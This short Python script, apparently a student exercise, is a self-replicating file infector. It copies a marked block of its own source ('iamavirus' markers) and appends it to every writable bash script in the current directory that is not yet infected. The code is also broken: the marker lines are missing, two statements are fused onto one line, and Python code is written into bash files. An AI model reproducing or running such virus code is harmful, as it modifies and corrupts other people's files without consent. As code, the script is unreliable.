import os
import subprocess
from datetime import datetime

print("123")
print("abc")

with open(__file__, 'r') as f:
    lines = f.readlines()
    mytxt = ''.join(lines[lines.index("#iamavirusA\n"):lines.index("#iamavirusB\n")])

for f in os.listdir('.'):
    if os.path.isfile(f): 
        if os.access(f, os.W_OK): 
            with open(f, 'r') as file:
                first_line = file.readline()
                if first_line.startswith("#!/bin/bash"):
                    with open(f, 'r') as file:
                        content = file.read()                        if "iamavirus" in content[-100:]:
                            print(" having virus already")

                        else:
                            with open(f, 'a') as file:
                                file.write(mytxt)
                else:
                    print(" not bash script")

        if datetime.now().strftime("%m%d") == "1111":
            print("today git ddl")
